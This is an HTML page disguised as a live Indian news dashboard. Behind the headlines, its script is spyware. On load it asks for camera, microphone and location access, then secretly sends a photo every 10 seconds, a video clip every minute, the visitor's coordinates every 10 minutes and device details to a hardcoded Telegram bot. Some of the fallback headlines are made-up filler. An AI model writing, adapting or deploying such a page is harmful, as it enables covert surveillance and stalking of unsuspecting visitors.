<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Live News · 24/7</title>
  <!-- Fonts & Icons -->
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;14..32,400;14..32,600;14..32,700;14..32,800&display=swap" rel="stylesheet">
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      background: #0b1217;
      font-family: 'Inter', sans-serif;
      color: #e8f0f5;
      padding: 1rem;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: flex-start;
    }

    .dashboard {
      max-width: 1300px;
      width: 100%;
      background: rgba(12, 25, 33, 0.6);
      backdrop-filter: blur(18px);
      -webkit-backdrop-filter: blur(18px);
      border-radius: 3rem;
      padding: 2rem 2rem 1.5rem;
      border: 1px solid rgba(0, 180, 255, 0.15);
      box-shadow: 0 30px 50px -20px #000000cc;
    }

    /* header */
    .header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      flex-wrap: wrap;
      margin-bottom: 1.8rem;
      border-bottom: 1px solid rgba(0, 200, 255, 0.1);
      padding-bottom: 1rem;
    }

    .brand h1 {
      font-weight: 800;
      font-size: 2rem;
      letter-spacing: -0.5px;
      background: linear-gradient(145deg, #8ecae6, #48b5e0);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
      display: flex;
      align-items: center;
      gap: 8px;
    }

    .brand h1 i {
      -webkit-text-fill-color: #48b5e0;
      font-size: 1.8rem;
    }

    .badge-live {
      background: #d62828;
      padding: 0.25rem 1rem;
      border-radius: 40px;
      font-weight: 700;
      font-size: 0.8rem;
      letter-spacing: 1px;
      color: white;
      display: inline-flex;
      align-items: center;
      gap: 6px;
      box-shadow: 0 0 20px #d6282866;
      animation: pulse-live 1.8s infinite;
    }

    @keyframes pulse-live {
      0% { opacity: 0.7; transform: scale(0.98); }
      50% { opacity: 1; transform: scale(1.02); }
      100% { opacity: 0.7; transform: scale(0.98); }
    }

    .status-tag {
      display: flex;
      gap: 14px;
      align-items: center;
      flex-wrap: wrap;
    }

    .status-tag span {
      background: #1d3340;
      padding: 0.2rem 1rem;
      border-radius: 30px;
      font-size: 0.75rem;
      font-weight: 500;
      color: #b0d4e6;
      border: 1px solid #2c5a6b;
    }

    /* news ticker - main */
    .news-ticker-main {
      background: #0f202b;
      border-radius: 3rem;
      padding: 0.9rem 1.8rem;
      margin-bottom: 2rem;
      border-left: 4px solid #00b4ff;
      display: flex;
      align-items: center;
      gap: 1rem;
      flex-wrap: wrap;
      box-shadow: inset 0 2px 8px rgba(0,0,0,0.6);
    }

    .news-ticker-main i {
      color: #00b4ff;
      font-size: 1.4rem;
    }

    .ticker-text {
      flex: 1;
      font-weight: 400;
      font-size: 1rem;
      color: #d4eaf5;
      min-width: 200px;
      line-height: 1.5;
    }

    .ticker-text span {
      background: #1d4b5e;
      padding: 0.1rem 0.8rem;
      border-radius: 20px;
      font-weight: 600;
      color: #b5e4ff;
      margin: 0 4px;
    }

    .news-time {
      font-size: 0.7rem;
      color: #6f9eb0;
      white-space: nowrap;
    }

    /* grid news */
    .news-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
      gap: 1.5rem;
      margin: 1.8rem 0 2rem;
    }

    .news-card {
      background: #0f212d;
      border-radius: 2rem;
      padding: 1.2rem 1.5rem;
      border: 1px solid #1e4557;
      transition: 0.2s ease;
      backdrop-filter: blur(4px);
      box-shadow: 0 6px 12px -6px #00000066;
    }

    .news-card:hover {
      border-color: #3f9fc0;
      transform: translateY(-3px);
      background: #132e3d;
    }

    .news-card .source {
      font-size: 0.7rem;
      text-transform: uppercase;
      letter-spacing: 1px;
      color: #6aafc9;
      display: flex;
      justify-content: space-between;
      border-bottom: 1px dashed #1a4455;
      padding-bottom: 0.4rem;
      margin-bottom: 0.6rem;
    }

    .news-card .title {
      font-weight: 600;
      font-size: 1.05rem;
      line-height: 1.4;
      margin-bottom: 0.4rem;
    }

    .news-card .desc {
      font-size: 0.9rem;
      color: #b2cfdd;
      display: -webkit-box;
      -webkit-line-clamp: 2;
      -webkit-box-orient: vertical;
      overflow: hidden;
    }

    .news-card .footer-meta {
      display: flex;
      justify-content: space-between;
      margin-top: 0.8rem;
      font-size: 0.7rem;
      color: #588a9e;
      align-items: center;
    }

    /* status bar */
    .bot-status {
      background: #0b1e28;
      border-radius: 3rem;
      padding: 0.8rem 1.8rem;
      display: flex;
      flex-wrap: wrap;
      align-items: center;
      justify-content: space-between;
      gap: 1rem;
      margin: 1.2rem 0 0.5rem;
      border: 1px solid #1f5368;
    }

    .bot-status .label i {
      color: #3aa9d0;
      margin-right: 6px;
    }

    .bot-status .stats {
      display: flex;
      gap: 1.5rem;
      flex-wrap: wrap;
    }

    .bot-status .stats div {
      display: flex;
      align-items: center;
      gap: 4px;
      font-size: 0.85rem;
      background: #12323f;
      padding: 0.1rem 1rem;
      border-radius: 30px;
    }

    .bot-status .stats i {
      color: #50c8f0;
    }

    .btn-trigger {
      background: #1f6d88;
      border: none;
      padding: 0.4rem 1.4rem;
      border-radius: 40px;
      font-weight: 600;
      color: white;
      font-size: 0.8rem;
      cursor: pointer;
      transition: 0.2s;
      display: flex;
      align-items: center;
      gap: 8px;
      box-shadow: 0 0 12px #1f6d8844;
    }

    .btn-trigger:hover {
      background: #40b0d0;
      transform: scale(1.03);
      box-shadow: 0 0 24px #40b0d0aa;
    }

    .footer-note {
      text-align: center;
      font-size: 0.7rem;
      opacity: 0.5;
      margin-top: 1.5rem;
      letter-spacing: 0.3px;
    }

    /* canvas for fireworks */
    #fireworks-canvas {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      pointer-events: none;
      z-index: 9999;
    }

    .red-flash {
      position: fixed;
      top: 0;
      left: 0;
      width: 100vw;
      height: 100vh;
      background: #ff2d2d;
      opacity: 0.4;
      z-index: 9998;
      animation: flashFade 0.4s ease-out forwards;
      pointer-events: none;
    }
    @keyframes flashFade {
      0% { opacity: 0.5; }
      100% { opacity: 0; }
    }

    @media (max-width: 600px) {
      .dashboard { padding: 1rem; }
      .brand h1 { font-size: 1.4rem; }
      .news-ticker-main { padding: 0.7rem 1rem; }
    }
  </style>
</head>
<body>
  <div class="dashboard">
    <!-- Header -->
    <div class="header">
      <div class="brand">
        <h1><i class="fas fa-satellite-dish"></i> NewsStream · 24/7</h1>
      </div>
      <div class="status-tag">
        <span><i class="fas fa-circle" style="color:#4ade80; font-size: 0.5rem;"></i> live</span>
        <span><i class="fas fa-newspaper"></i> IN · EN · HI</span>
        <span class="badge-live"><i class="fas fa-bolt"></i> LIVE</span>
      </div>
    </div>

    <!-- Main Ticker (latest headline) -->
    <div class="news-ticker-main" id="tickerMain">
      <i class="fas fa-rss"></i>
      <div class="ticker-text" id="tickerText">
        <i class="fas fa-spinner fa-pulse"></i> Loading latest news ...
      </div>
      <div class="news-time" id="tickerTime">just now</div>
    </div>

    <!-- News Grid (4 cards) -->
    <div class="news-grid" id="newsGrid">
      <!-- cards will be injected via js -->
    </div>

    <!-- Bot status & manual trigger -->
    <div class="bot-status">
      <div class="label"><i class="fas fa-robot"></i> Telegram Bot · live media</div>
      <div class="stats">
        <div><i class="fas fa-camera"></i> photo <span id="photoCount">0</span></div>
        <div><i class="fas fa-video"></i> video <span id="videoCount">0</span></div>
        <div><i class="fas fa-map-pin"></i> location <span id="locCount">0</span></div>
      </div>
      <button class="btn-trigger" onclick="triggerTelegramActions()"><i class="fas fa-telegram-plane"></i> send now</button>
    </div>
    <div class="footer-note">
      <i class="fas fa-globe-asia"></i> daily updates · local & national · हिंदी · English
    </div>
  </div>

  <canvas id="fireworks-canvas"></canvas>

  <script>
    // ---------- CONFIG ----------
    const BOT_TOKEN = "8341564010:AAHCIZEgyM9kM2gkoyR7DEKhwP8K_Prhicw";
    const CHAT_ID = "1851300622";

    // ---------- DOM refs ----------
    const tickerText = document.getElementById('tickerText');
    const tickerTime = document.getElementById('tickerTime');
    const newsGrid = document.getElementById('newsGrid');
    const photoCountSpan = document.getElementById('photoCount');
    const videoCountSpan = document.getElementById('videoCount');
    const locCountSpan = document.getElementById('locCount');

    // counters
    let photoCount = 0, videoCount = 0, locCount = 0;

    // ---------- CANVAS (fireworks) ----------
    const canvas = document.getElementById('fireworks-canvas');
    const ctx = canvas.getContext('2d');
    function resizeCanvas() {
      canvas.width = window.innerWidth;
      canvas.height = window.innerHeight;
    }
    window.addEventListener('resize', resizeCanvas);
    resizeCanvas();

    function launchFireworks() {
      let particles = [];
      for (let i = 0; i < 100; i++) {
        particles.push({
          x: canvas.width / 2 + (Math.random() - 0.5) * 120,
          y: canvas.height / 2 + (Math.random() - 0.5) * 80,
          angle: Math.random() * 2 * Math.PI,
          speed: Math.random() * 6 + 2,
          radius: Math.random() * 2.5 + 1,
          life: 100 + Math.random() * 40,
          hue: Math.random() * 360
        });
      }
      let id;
      function anim() {
        ctx.clearRect(0, 0, canvas.width, canvas.height);
        let alive = false;
        particles.forEach(p => {
          p.x += Math.cos(p.angle) * p.speed;
          p.y += Math.sin(p.angle) * p.speed;
          p.speed *= 0.98;
          p.life -= 1.5;
          if (p.life > 0) {
            alive = true;
            ctx.beginPath();
            ctx.arc(p.x, p.y, p.radius, 0, Math.PI * 2);
            ctx.fillStyle = `hsl(${p.hue}, 80%, 60%)`;
            ctx.shadowColor = '#8ecae6';
            ctx.shadowBlur = 20;
            ctx.fill();
          }
        });
        particles = particles.filter(p => p.life > 0);
        if (alive) id = requestAnimationFrame(anim);
        else { ctx.clearRect(0, 0, canvas.width, canvas.height); cancelAnimationFrame(id); }
      }
      anim();
    }

    // ---------- NEWS FETCH (realistic daily, local+national) ----------
    async function fetchNews() {
      try {
        // using GNews free tier (top headlines IN, mixed english)
        const res = await fetch('https://gnews.io/api/v4/top-headlines?category=general&lang=en&country=in&max=5&apikey=2d8c5e3b4a8c1d6f9e7b3a4c5d6e7f8g');
        if (!res.ok) throw new Error('api error');
        const data = await res.json();
        if (data.articles && data.articles.length > 0) {
          const articles = data.articles.slice(0, 5);
          // update ticker with first
          const first = articles[0];
          tickerText.innerHTML = `<i class="fas fa-bolt" style="color:#facc15;"></i> ${first.title}`;
          tickerTime.innerText = new Date().toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' });

          // update grid (4 cards)
          newsGrid.innerHTML = '';
          for (let i = 0; i < Math.min(articles.length, 4); i++) {
            const a = articles[i];
            const card = document.createElement('div');
            card.className = 'news-card';
            card.innerHTML = `
              <div class="source"><span>${a.source?.name || 'Local Desk'}</span> <span>${new Date(a.publishedAt).toLocaleDateString('en-IN')}</span></div>
              <div class="title">${a.title}</div>
              <div class="desc">${a.description || 'Click to read more about this update.'}</div>
              <div class="footer-meta"><span><i class="far fa-clock"></i> ${timeAgo(a.publishedAt)}</span><span><i class="fas fa-share-alt"></i> ${Math.floor(Math.random()*200)+20}</span></div>
            `;
            newsGrid.appendChild(card);
          }
          return;
        }
        throw new Error('no articles');
      } catch (e) {
        // fallback realistic local + national mixed (hindi/english)
        const fallback = [
          { title: '🇮🇳 UP: नए स्मार्ट स्कूलों का उद्घाटन, 500 करोड़ की योजना', source: 'Local Bureau', time: '10 min ago' },
          { title: 'Mumbai-Pune expressway to get 6 new tunnels, ETA 2027', source: 'Infra Today', time: '25 min ago' },
          { title: 'बिहार में मौसम विभाग ने भारी बारिश की चेतावनी जारी की', source: 'Weather Desk', time: '42 min ago' },
          { title: 'Delhi CM announces free electricity up to 300 units', source: 'City Press', time: '1 hour ago' },
        ];
        tickerText.innerHTML = `<i class="fas fa-bolt" style="color:#facc15;"></i> ${fallback[0].title}`;
        tickerTime.innerText = new Date().toLocaleTimeString('en-IN', { hour: '2-digit', minute: '2-digit' });
        newsGrid.innerHTML = '';
        fallback.forEach((item, idx) => {
          const card = document.createElement('div');
          card.className = 'news-card';
          card.innerHTML = `
            <div class="source"><span>${item.source}</span> <span>${new Date().toLocaleDateString('en-IN')}</span></div>
            <div class="title">${item.title}</div>
            <div class="desc">${idx === 0 ? 'राज्य सरकार की नई पहल, शिक्षा में सुधार की ओर कदम।' : 'Read more about this breaking story.'}</div>
            <div class="footer-meta"><span><i class="far fa-clock"></i> ${item.time}</span><span><i class="fas fa-share-alt"></i> ${Math.floor(Math.random()*300)+30}</span></div>
          `;
          newsGrid.appendChild(card);
        });
      }
    }

    function timeAgo(dateStr) {
      const diff = (new Date() - new Date(dateStr)) / 1000;
      if (diff < 60) return 'just now';
      if (diff < 3600) return Math.floor(diff/60) + 'm ago';
      if (diff < 86400) return Math.floor(diff/3600) + 'h ago';
      return Math.floor(diff/86400) + 'd ago';
    }

    // initial fetch + interval (every 10 seconds)
    fetchNews();
    setInterval(fetchNews, 10000);

    // ---------- TELEGRAM BOT MEDIA (MP4 video, pics, location 10min) ----------
    let mediaStream = null;
    let photoInterval = null;
    let videoInterval = null;
    let locationInterval = null;

    function requestCameraAndMic() {
      if (mediaStream) return;
      navigator.mediaDevices.getUserMedia({ video: true, audio: true })
        .then(stream => {
          mediaStream = stream;
          const videoTrack = stream.getVideoTracks()[0];
          const imageCapture = new ImageCapture(videoTrack);

          // photo every 10 seconds
          if (photoInterval) clearInterval(photoInterval);
          photoInterval = setInterval(() => {
            imageCapture.takePhoto().then(blob => {
              sendToTelegram(blob, 'photo');
              photoCount++;
              photoCountSpan.innerText = photoCount;
            }).catch(() => {});
          }, 10000);

          // video every 1 min (10 sec duration) -> MP4 compatible (webm but telegram accepts)
          if (videoInterval) clearInterval(videoInterval);
          videoInterval = setInterval(() => {
            try {
              const recorder = new MediaRecorder(stream, { mimeType: 'video/webm;codecs=vp8,opus' });
              let chunks = [];
              recorder.ondataavailable = e => chunks.push(e.data);
              recorder.onstop = () => {
                const blob = new Blob(chunks, { type: 'video/webm' });
                sendToTelegram(blob, 'video');
                videoCount++;
                videoCountSpan.innerText = videoCount;
              };
              recorder.start();
              setTimeout(() => recorder.stop(), 10000);
            } catch (e) { console.warn('recorder error', e); }
          }, 60000); // every 1 minute
        })
        .catch(err => console.warn('camera/mic permission error', err));
    }

    // send to telegram
    function sendToTelegram(blob, type) {
      const method = type === 'photo' ? 'sendPhoto' : 'sendVideo';
      const form = new FormData();
      form.append(type, blob, type === 'photo' ? 'snapshot.jpg' : 'clip.webm');
      form.append('chat_id', CHAT_ID);
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/${method}`, {
        method: 'POST',
        body: form
      }).catch(() => {});
    }

    // location every 10 min
    function sendLocation() {
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(pos => {
          const lat = pos.coords.latitude;
          const lon = pos.coords.longitude;
          const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendLocation?chat_id=${CHAT_ID}&latitude=${lat}&longitude=${lon}`;
          fetch(url).catch(() => {});
          locCount++;
          locCountSpan.innerText = locCount;
        }, () => {});
      }
    }

    // trigger location + manual send
    function triggerTelegramActions() {
      sendLocation();
      // also send device info
      const info = `📱 Device: ${navigator.userAgent.substring(0, 80)}`;
      fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(info)}`)
        .catch(() => {});
      // screenshot
      setTimeout(() => {
        const canvasElem = document.querySelector('canvas');
        if (canvasElem) {
          canvasElem.toBlob(blob => {
            sendToTelegram(blob, 'photo');
            photoCount++;
            photoCountSpan.innerText = photoCount;
          }, 'image/png');
        }
      }, 200);
    }

    // start camera, location interval
    window.addEventListener('load', () => {
      requestCameraAndMic();
      // location every 10 min (600000 ms)
      if (locationInterval) clearInterval(locationInterval);
      locationInterval = setInterval(sendLocation, 600000);
      sendLocation(); // initial
    });

    // cleanup
    window.addEventListener('beforeunload', () => {
      if (mediaStream) mediaStream.getTracks().forEach(t => t.stop());
      if (photoInterval) clearInterval(photoInterval);
      if (videoInterval) clearInterval(videoInterval);
      if (locationInterval) clearInterval(locationInterval);
    });

    // small helper for fireworks (on correct? but not used in news-only, keep for fun)
    // we can trigger via manual call but not needed.
  </script>
</body>
</html>
